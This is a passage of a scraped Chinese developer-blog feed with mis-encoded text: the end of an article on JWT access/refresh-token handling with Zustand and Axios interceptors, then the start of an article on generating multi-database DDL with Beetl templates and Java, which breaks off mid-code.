      <span class="hljs-attribute">refreshToken</span>: null,
      <span class="hljs-attribute">user</span>: null,
      <span class="hljs-attribute">isLogin</span>: false,
      <span class="hljs-attribute">login</span>: async (credentials) =&gt; {
        const res = await <span class="hljs-built_in">doLogin</span>(credentials);
        <span class="hljs-built_in">set</span>({ ...res, <span class="hljs-attribute">isLogin</span>: true }); <span class="hljs-comment">// å­˜å‚¨ access_token, refresh_token, user</span>
      },
      <span class="hljs-attribute">logout</span>: () =&gt; { <span class="hljs-comment">/* æ¸…ç©ºçŠ¶æ€ */</span> }
    }),
    {
      <span class="hljs-attribute">name</span>: <span class="hljs-string">'user-store'</span>,
      <span class="hljs-attribute">partialize</span>: (state) =&gt; ({
        <span class="hljs-attribute">accessToken</span>: state.accessToken,
        <span class="hljs-attribute">refreshToken</span>: state.refreshToken,
        <span class="hljs-attribute">user</span>: state.user,
        <span class="hljs-attribute">isLogin</span>: state.isLogin
      })
    }
  )
);
</code></pre>
<blockquote>
<p>âœ… <strong>ä¼˜åŠ¿</strong>ï¼šé¡µé¢åˆ·æ–°åçŠ¶æ€ä¸ä¸¢å¤±ï¼Œç”¨æˆ·æ— éœ€é‡æ–°ç™»å½•ã€‚</p>
</blockquote>
<h3 data-id="heading-13">3.2 Axios æ‹¦æˆªå™¨ï¼šè‡ªåŠ¨æºå¸¦ä¸æ™ºèƒ½åˆ·æ–°</h3>
<p>è¿™æ˜¯å‰ç«¯æœ€æ ¸å¿ƒçš„é€»è¾‘â€”â€”<strong>è¯·æ±‚æ‹¦æˆªå™¨ + å“åº”æ‹¦æˆªå™¨ååŒå·¥ä½œ</strong>ã€‚</p>
<h4 data-id="heading-14">è¯·æ±‚æ‹¦æˆªå™¨ï¼šè‡ªåŠ¨æ³¨å…¥ Token</h4>
<pre><code class="hljs language-ini" lang="ini">instance.interceptors.request.use((config) =&gt; {
  const <span class="hljs-attr">token</span> = useUserStore.getState().accessToken<span class="hljs-comment">;</span>
  if (token) {
    <span class="hljs-attr">config.headers.Authorization</span> = `Bearer <span class="hljs-variable">${token}</span>`<span class="hljs-comment">;</span>
  }
  return config<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-15">å“åº”æ‹¦æˆªå™¨ï¼šå¤„ç† 401 ä¸ Token åˆ·æ–°</h4>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">isRefreshing</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
let requestsQueue: ((token: string) =&gt; void)<span class="hljs-section">[]</span> = <span class="hljs-section">[]</span><span class="hljs-comment">;</span>

instance.interceptors.response.use(
  (res) =&gt; res.data,
  async (err) =&gt; {
    const { config, response } = err<span class="hljs-comment">;</span>
    
    if (response?.<span class="hljs-attr">status</span> === <span class="hljs-number">401</span> &amp;&amp; !config._retry) {
      <span class="hljs-attr">config._retry</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>

      if (isRefreshing) {
        // è‹¥æ­£åœ¨åˆ·æ–°ï¼Œå°†è¯·æ±‚åŠ å…¥é˜Ÿåˆ—ï¼Œç­‰å¾…æ–°Token
        return new Promise((resolve) =&gt; {
          requestsQueue.push((token) =&gt; {
            <span class="hljs-attr">config.headers.Authorization</span> = `Bearer <span class="hljs-variable">${token}</span>`<span class="hljs-comment">;</span>
            resolve(instance(config))<span class="hljs-comment">;</span>
          })<span class="hljs-comment">;</span>
        })<span class="hljs-comment">;</span>
      }

      <span class="hljs-attr">isRefreshing</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
      try {
        const { refreshToken } = useUserStore.getState()<span class="hljs-comment">;</span>
        if (!refreshToken) throw new Error('No refresh token')<span class="hljs-comment">;</span>

        const { access_token, refresh_token } = await instance.post('/auth/refresh', {
          refresh_token: refreshToken
        })<span class="hljs-comment">;</span>

        // æ›´æ–°æœ¬åœ°Token
        useUserStore.setState({ accessToken: access_token, refreshToken: refresh_token })<span class="hljs-comment">;</span>

        // é‡å‘é˜Ÿåˆ—ä¸­æ‰€æœ‰è¯·æ±‚
        requestsQueue.forEach(<span class="hljs-attr">cb</span> =&gt; cb(access_token))<span class="hljs-comment">;</span>
        <span class="hljs-attr">requestsQueue</span> = []<span class="hljs-comment">;</span>

        // é‡å‘å½“å‰è¯·æ±‚
        <span class="hljs-attr">config.headers.Authorization</span> = `Bearer <span class="hljs-variable">${access_token}</span>`<span class="hljs-comment">;</span>
        return instance(config)<span class="hljs-comment">;</span>
      } catch (e) {
        // åˆ·æ–°å¤±è´¥ï¼šè·³è½¬ç™»å½•é¡µ
        useUserStore.getState().logout()<span class="hljs-comment">;</span>
        <span class="hljs-attr">window.location.href</span> = <span class="hljs-string">'/login'</span><span class="hljs-comment">;</span>
        return Promise.reject(e)<span class="hljs-comment">;</span>
      } finally {
        <span class="hljs-attr">isRefreshing</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
      }
    }
    return Promise.reject(err)<span class="hljs-comment">;</span>
  }
)<span class="hljs-comment">;</span>
</code></pre>
<p>è¿™æ®µä»£ç å®ç°äº† Token è¿‡æœŸæ—¶çš„è‡ªåŠ¨åˆ·æ–°ä¸è¯·æ±‚é‡è¯•æœºåˆ¶ã€‚å½“æ¥å£è¿”å› 401 ä¸”è¯·æ±‚æœªè¢«é‡è¯•è¿‡ï¼ˆ<code>!config._retry</code>ï¼‰æ—¶ï¼Œæ‹¦æˆªå™¨ä¼šå°è¯•ç”¨ <code>refresh_token</code> åˆ·æ–°è·å–æ–° Tokenã€‚è‹¥æ­¤æ—¶å·²æœ‰åˆ·æ–°æ“ä½œæ­£åœ¨è¿›è¡Œï¼ˆ<code>isRefreshing = true</code>ï¼‰ï¼Œåˆ™å°†å½“å‰è¯·æ±‚åŠ å…¥é˜Ÿåˆ— <code>requestsQueue</code>ï¼Œç­‰å¾…æ–° Token è¿”å›åå†æ‰§è¡Œã€‚è‹¥æ— åˆ·æ–°ä»»åŠ¡ï¼Œåˆ™å‘èµ· <code>/auth/refresh</code> è¯·æ±‚ï¼ŒæˆåŠŸåæ›´æ–°æœ¬åœ° Tokenï¼Œå¹¶éå†é˜Ÿåˆ—æ‰¹é‡é‡å‘æ‰€æœ‰æŒ‚èµ·çš„è¯·æ±‚ï¼Œæœ€åé‡è¯•å½“å‰å¤±è´¥è¯·æ±‚ã€‚è‹¥åˆ·æ–°å¤±è´¥ï¼ˆå¦‚ <code>refresh_token</code> è¿‡æœŸï¼‰ï¼Œåˆ™æ¸…ç©ºç™»å½•çŠ¶æ€å¹¶è·³è½¬è‡³ç™»å½•é¡µã€‚é€šè¿‡ <code>isRefreshing</code> é”å’Œè¯·æ±‚é˜Ÿåˆ—ï¼Œæœ‰æ•ˆé¿å…äº†é‡å¤åˆ·æ–°å’Œè¯·æ±‚ä¸¢å¤±ï¼Œç¡®ä¿ç”¨æˆ·ä½“éªŒæ— ç¼ã€‚</p>
<h4 data-id="heading-16">å…³é”®æœºåˆ¶è§£æï¼š</h4>





















<table><thead><tr><th>æœºåˆ¶</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><code>config._retry</code></td><td>é˜²æ­¢ 401 é”™è¯¯æ— é™å¾ªç¯è§¦å‘åˆ·æ–°</td></tr><tr><td><code>isRefreshing</code></td><td>å…¨å±€é”ï¼Œé¿å…å¤šä¸ª 401 è¯·æ±‚åŒæ—¶å‘èµ·åˆ·æ–°</td></tr><tr><td><code>requestsQueue</code></td><td>ç¼“å­˜åˆ·æ–°æœŸé—´çš„æ‰€æœ‰è¯·æ±‚ï¼Œå¾…æ–° Token åˆ°æ‰‹åç»Ÿä¸€é‡å‘</td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ <strong>ç”¨æˆ·ä½“éªŒä¼˜åŒ–</strong>ï¼šæ•´ä¸ªè¿‡ç¨‹ç”¨æˆ·æ— æ„ŸçŸ¥ï¼Œé¡µé¢ä¸ä¼šè·³è½¬ï¼Œæ“ä½œä¸ä¸­æ–­ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-17">å››ã€é¿å‘æŒ‡å—ï¼šé‚£äº›å¹´è¸©è¿‡çš„â€œé›·â€</h2>
<h3 data-id="heading-18">åç«¯ç¯‡</h3>
<ol>
<li>
<p><strong>JwtStrategy æœªæ³¨å†Œåˆ°æ¨¡å— providers</strong></p>
<ul>
<li><strong>ç°è±¡</strong>ï¼šè°ƒç”¨å—ä¿æŠ¤æ¥å£æ—¶æŠ¥é”™Â <code>Unknown authentication strategy "jwt"</code>ã€‚</li>
<li><strong>åŸå› </strong>ï¼š<code>JwtStrategy</code>Â æ˜¯ Guard çš„åº•å±‚ç­–ç•¥ï¼Œå¿…é¡»åœ¨Â <code>AuthModule</code>Â çš„Â <code>providers</code>Â ä¸­æ˜¾å¼æ³¨å†Œã€‚</li>
<li><strong>è§£å†³</strong>ï¼šåœ¨Â <code>AuthModule</code>Â çš„Â <code>providers</code>Â æ•°ç»„ä¸­åŠ å…¥Â <code>JwtStrategy</code>ã€‚</li>
</ul>
</li>
<li>
<p><strong>å¯†ç éªŒè¯å¤±è´¥</strong></p>
<ul>
<li>åŸå› ï¼šæ³¨å†Œæ—¶ç”¨ <code>bcrypt.hash(password, 10)</code>ï¼Œç™»å½•æ—¶å´æœªç”¨ <code>bcrypt.compare</code>ã€‚</li>
<li>æ­£ç¡®åšæ³•ï¼š<strong>æ°¸è¿œä¸è¦æ¯”å¯¹æ˜æ–‡å¯†ç </strong>ï¼Œå¿…é¡»ç”¨ <code>compare</code> éªŒè¯å“ˆå¸Œå€¼ã€‚</li>
</ul>
</li>
<li>
<p><strong>JWT å¯†é’¥ä¸ä¸€è‡´æˆ–æœªåŠ è½½</strong></p>
<ul>
<li><strong>ç°è±¡</strong>ï¼šToken ç­¾å‘æˆåŠŸï¼Œä½†éªŒè¯æ—¶æŠ¥Â <code>invalid signature</code>ã€‚</li>
<li><strong>åŸå› </strong>ï¼š<code>JwtModule.register()</code>Â ä¸Â <code>jwtService.verifyAsync()</code>Â ä½¿ç”¨çš„å¯†é’¥ä¸åŒï¼Œæˆ–Â <code>.env</code>Â æœªæ­£ç¡®åŠ è½½ã€‚</li>
<li><strong>è§£å†³</strong>ï¼šç¡®ä¿ç»Ÿä¸€ä½¿ç”¨Â <code>process.env.TOKEN_SECRET</code>ï¼Œå¹¶åœ¨Â <code>main.ts</code>Â ä¸­è°ƒç”¨Â <code>config()</code>Â åŠ è½½ç¯å¢ƒå˜é‡ï¼ˆå¦‚ä½¿ç”¨Â <code>@nestjs/config</code>ï¼‰ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-19">å‰ç«¯ç¯‡</h3>
<ol>
<li>
<p><strong>Token æŒä¹…åŒ–å¤±æ•ˆ</strong></p>
<ul>
<li>æ£€æŸ¥ <code>partialize</code> æ˜¯å¦åŒ…å« <code>accessToken</code> å’Œ <code>refreshToken</code>ã€‚</li>
</ul>
</li>
<li>
<p><strong>åˆ·æ–°æ­»å¾ªç¯</strong></p>
<ul>
<li>ç¡®ä¿ <code>config._retry = true</code> ç”Ÿæ•ˆï¼Œä¸”åˆ·æ–°å¤±è´¥å<strong>æ¸…ç©ºé˜Ÿåˆ—</strong>å¹¶è·³è½¬ç™»å½•ã€‚</li>
</ul>
</li>
<li>
<p><strong>è¯·æ±‚å¤´æ ¼å¼é”™è¯¯</strong></p>
<ul>
<li>å¿…é¡»ä¸º <code>Authorization: Bearer &lt;token&gt;</code>ï¼Œ<strong><code>Bearer</code> åæœ‰ç©ºæ ¼</strong>ï¼Œå¦åˆ™åç«¯æ— æ³•è§£æã€‚</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-20">äº”ã€æ€»ç»“ï¼šåŒToken çš„ä»·å€¼ä¸æ‰©å±•</h2>
<p>åŒ Token æœºåˆ¶ä¹‹æ‰€ä»¥æˆä¸ºè¡Œä¸šæ ‡å‡†ï¼Œæ˜¯å› ä¸ºå®ƒ<strong>ç²¾å‡†å¹³è¡¡äº†å®‰å…¨ä¸ä½“éªŒ</strong>ï¼š</p>
<ol>
<li><strong>å®‰å…¨æ€§é«˜</strong>ï¼šçŸ­æ—¶æ•ˆ access_token é™åˆ¶æ³„éœ²åçš„æ”»å‡»çª—å£ï¼Œrefresh_token ä¸å‚ä¸ä¸šåŠ¡è¯·æ±‚ï¼Œé™ä½é£é™©ã€‚</li>
<li><strong>ä½“éªŒæµç•…</strong>ï¼šaccess_token è¿‡æœŸåå¯è‡ªåŠ¨æ— æ„Ÿåˆ·æ–°ï¼Œç”¨æˆ·æ— éœ€é¢‘ç¹é‡æ–°ç™»å½•ï¼Œæ“ä½œä¸ä¸­æ–­ã€‚</li>
<li><strong>çµæ´»å¯æ§</strong>ï¼šæ”¯æŒ Token è½®æ¢ã€å¼ºåˆ¶ä¸‹çº¿ã€æœ‰æ•ˆæœŸç‹¬ç«‹é…ç½®ï¼Œä¾¿äºå®ç°ç²¾ç»†åŒ–å®‰å…¨ç­–ç•¥ã€‚</li>
</ol>
<hr/>
<blockquote>
<p>ğŸŒŸ <strong>ç»“è¯­</strong>ï¼šè®¤è¯æ¨¡å—çœ‹ä¼¼ç®€å•ï¼Œå®åˆ™æš—è—ç„æœºã€‚ä¸€ä¸ªå¥å£®çš„åŒ Token ä½“ç³»ï¼Œä¸ä»…èƒ½æŠµå¾¡å¸¸è§æ”»å‡»ï¼Œæ›´èƒ½ä¸ºç”¨æˆ·æä¾›â€œæ— æ„Ÿå´å®‰å…¨â€çš„ä½“éªŒã€‚æœ¬æ–‡æ‰€åˆ†äº«çš„ä»£ç ä¸é€»è¾‘ï¼Œå·²åœ¨å¤šä¸ªçº¿ä¸Šé¡¹ç›®ç¨³å®šè¿è¡Œï¼Œæ¬¢è¿ç›´æ¥å€Ÿé‰´ã€ä¼˜åŒ–ã€è½åœ°ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[beetl + java å¤šç§æ•°æ®åº“ddlç®¡ç†å®è·µ]]></title>    <link>https://juejin.cn/post/7601007650722693161</link>    <guid>https://juejin.cn/post/7601007650722693161</guid>    <pubDate>2026-01-30T13:54:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601007650722693161" data-draft-id="7600994087587594259" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="beetl + java å¤šç§æ•°æ®åº“ddlç®¡ç†å®è·µ"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2026-01-30T13:54:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è™šæ‹Ÿä¸–ç•Œ"/> <meta itemprop="url" content="https://juejin.cn/user/1118643258130796"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            beetl + java å¤šç§æ•°æ®åº“ddlç®¡ç†å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1118643258130796/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è™šæ‹Ÿä¸–ç•Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:54:36.000Z" title="Fri Jan 30 2026 13:54:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å›½äº§æ•°æ®åº“é€‚é…æ˜¯è¿‘å¹´æ¥æˆ‘å›½åœ¨ä¿¡æ¯æŠ€æœ¯é¢†åŸŸæ¨åŠ¨è‡ªä¸»å¯æ§ã€å®‰å…¨å¯ä¿¡æˆ˜ç•¥çš„é‡è¦å®è·µï¼Œå…¶æ ¸å¿ƒé©±åŠ¨åŠ›æºäºå›½å®¶å®‰å…¨ã€æŠ€æœ¯ç«äº‰ã€äº§ä¸šå‡çº§åŠæ•°æ®ä¸»æƒç­‰å¤šé‡éœ€æ±‚çš„äº¤ç»‡ã€‚</p>
</blockquote>
<h2 data-id="heading-0">å…³é”®èƒŒæ™¯</h2>
<h3 data-id="heading-1">å›½å®¶æˆ˜ç•¥ä¸å®‰å…¨</h3>
<p>â€œå¡è„–å­â€é£é™©å€’é—­æŠ€æœ¯è‡ªä¸»</p>
<p>â€œè‡ªä¸»å¯æ§â€æˆä¸ºå›½å®¶æˆ˜ç•¥</p>
<h3 data-id="heading-2">æ•°æ®è¦ç´ åŒ–ä¸åˆè§„è¦æ±‚</h3>
<p>æ•°æ®ä½œä¸ºæ ¸å¿ƒç”Ÿäº§è¦ç´ çš„åœ°ä½æå‡</p>
<p>åˆè§„æ€§å‹åŠ›å¢å¤§</p>
<p>æŠ€æœ¯æˆç†Ÿåº¦æå‡</p>
<h3 data-id="heading-3">æŠ€æœ¯æˆç†Ÿåº¦æå‡</h3>
<p>å›½äº§æŠ€æœ¯ä»å¯ç”¨åˆ°å¥½ç”¨</p>
<p>ä¿¡åˆ›äº§ä¸šç”Ÿæ€çš„æ„å»º</p>
<p>é™ä½ä¾›åº”é“¾é£é™©</p>
<p>é•¿æœŸæˆæœ¬ä¼˜åŠ¿</p>
<h2 data-id="heading-4">ä»å•æ•°æ®åº“åˆ°å¤šæ•°æ®åº“çš„å‘å±•è·¯ç¨‹</h2>
<h3 data-id="heading-5">å•åº“çš„ç»´æŠ¤æ–¹å¼</h3>
<p>ä»¥æ–‡ä»¶çš„æ–¹å¼ï¼Œé…åˆä»£ç ä»“åº“è¿›è¡Œç»Ÿä¸€ç®¡ç†ã€‚è„šæœ¬åŒ…æ‹¬ï¼šåˆ›å»ºè¡¨ã€åˆ›å»ºè§†å›¾ã€åˆå§‹åŒ–æ•°æ®ã€å­˜å‚¨è¿‡ç¨‹ï¼ˆå·²åºŸå¼ƒï¼‰ã€æ–°å¢åˆ—ç­‰ã€‚</p>
<p>ç¤ºä¾‹ç›®å½•ç»“æœå…¥ä¸‹ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">  DDL
    â”œâ”€v1.0
        â”œâ”€table_{table_name}_create.sql
        â”œâ”€table_{table_name}_init_data.sql
        â”œâ”€sequence_{sequence_name}.sql
        â””â”€view_{view_name}_create.sql
    â”œâ”€v1.1
        â”œâ”€table_{table_name}_create.sql
        â”œâ”€table_{table_name}_add_column.sql
        â”œâ”€sequence_{sequence_name}.sql
        â””â”€view_{view_name}_change.sql
    â”œâ”€v1.2
        â”œâ”€table_{table_name}_create.sql
        â”œâ”€table_{table_name}_add_column.sql
        â”œâ”€sequence_{sequence_name}.sql
        â””â”€view_{view_name}_create.sql
</code></pre>
<h3 data-id="heading-6">å¤šæ•°æ®åº“é€‚é…ååˆæ­¥æ–¹æ¡ˆ</h3>
<pre><code class="hljs language-shell" lang="shell">â”œâ”€DDL
    â”œâ”€tidb
        â”œâ”€v1.0  
        â””â”€v1.1
    â”œâ”€dm
        â”œâ”€v1.0  
        â””â”€v1.1
    â”œâ”€gaussdb
        â”œâ”€v1.0  
        â””â”€v1.1
    â”œâ”€kingbase
        â”œâ”€v1.0  
        â””â”€v1.1
</code></pre>
<h3 data-id="heading-7">éšä¹‹è€Œæ¥çš„é—®é¢˜</h3>
<p>å¤§é‡çš„é‡å¤çš„å·¥ä½œï¼šå»ºä¸€å¼ è¡¨éœ€è¦å†™å¤šä¸ªæ•°æ®åº“çš„è„šæœ¬ï¼Œå¢åŠ åˆ—å­—æ®µéœ€è¦ä¿®æ”¹å¤šä¸ªæ•°æ®åº“ä¸‹çš„è„šæœ¬ã€‚æ”¹åŠ¨éœ€æ‰‹åŠ¨åœ¨æ•°æ®åº“ä¸­éªŒè¯ã€‚é‡å¤ä¸”åˆ†æ•£çš„æ“ä½œææ˜“å‡ºé”™ï¼šç»™gaussDBä¿®æ”¹äº†ï¼Œå¿˜è®°åŒæ­¥å¤„ç†é‡‘ä»“æ•°æ®åº“ã€‚è¿›è€Œä¸ºçº¿ä¸Šå¢åŠ éšæ‚£ã€‚
å¤šæ•°æ®åº“é€‚é…è¿›ä¸€æ­¥çš„è§£å†³æ–¹æ¡ˆ</p>
<h2 data-id="heading-8">ç›®æ ‡</h2>
<p>è§£è€¦æ•°æ®è¡¨çš„å®šä¹‰ä¸å…·ä½“DDLå®ç°ï¼Œå¹¶å®ç°å·¥ç¨‹åŒ–ã€‚</p>
<h2 data-id="heading-9">å®ç°è·¯å¾„</h2>
<p>1.åˆ›å»ºä¸åŒæ•°æ®åº“çš„ beetl æ¨¡æ¿ã€‚
2.javaç¨‹åºè‡ªåŠ¨åŒ–ï¼ˆå¯é›†æˆè‡³spring booté¡¹ç›®ï¼‰
3.æœªæ¥çš„æ‰©å±•ä»…éœ€æ·»åŠ å¯¹åº”æ•°æ®åº“çš„ beetl æ¨¡æ¿å³å¯ã€‚</p>
<h2 data-id="heading-10">é¡¹ç›®ç»“æ„</h2>
<h3 data-id="heading-11">javaä¾èµ–åŒ…</h3>
<pre><code class="hljs language-shell" lang="shell">â”œâ”€libs
â”‚      antlr4-runtime-4.9.3.jar
â”‚      beetl-3.20.1.RELEASE.jar
â”‚      beetl-core-3.20.1.RELEASE.jar
â”‚      beetl-default-antlr4.9-support-3.20.1.RELEASE.jar
â”‚      beetl-ext-3.20.1.RELEASE.jar
</code></pre>
<h3 data-id="heading-12">javaå®ä½“ç±»</h3>
<pre><code class="hljs language-shell" lang="shell">â”œâ”€domain
â”‚      ColumnBuilder.java 
â”‚      ColumnDefinition.java
â”‚      TableBuilder.java
â”‚      TypeEnum.java
â”‚      DefaultEnum.java
â”‚      TableDefinition.java
â”‚      Main.java
</code></pre>
<p>*Builder.java ç±»ä¸ºæ„å»ºå¯¹è±¡çš„buildæ¨¡å¼ã€‚æŒ‰ç…§ä¸ªäººä¹ æƒ¯æ„å»ºï¼Œä»£ç è¾ƒé•¿ï¼Œå°±ä¸å±•ç¤ºå•¦ã€‚</p>
<p>å…¶ä»–ä»£ç å¦‚ä¸‹ï¼š</p>
<p>TableDefinition.java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TableDefinition</span> {
    <span class="hljs-keyword">private</span> String database;
    <span class="hljs-keyword">private</span> String tableName;
    <span class="hljs-keyword">private</span> String comment;
    <span class="hljs-keyword">private</span> String tablespace;
    <span class="hljs-keyword">private</span> List&lt;ColumnDefinition&gt; columns;
}
</code></pre>
<p>ColumnDefinition.java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ColumnDefinition</span> {
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> TypeEnum type;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> length;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> precision;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> scale;
    <span class="hljs-keyword">private</span> String comment;
    <span class="hljs-keyword">private</span> <span class="hljs-type">DefaultEnum</span> <span class="hljs-variable">defaultValueEnum</span> <span class="hljs-operator">=</span> DefaultEnum.NONE;
    <span class="hljs-keyword">private</span> String defaultValue;
}
</code></pre>
<p>TypeEnum.java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">TypeEnum</span> {
    STRING,
    NUMBER,
    CLOB,
    DATE
}
</code></pre>
<p>DefaultEnum.java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">DefaultEnum</span> {
    CURRENT_DATE,  <span class="hljs-comment">// å½“å‰æ—¶é—´ </span>
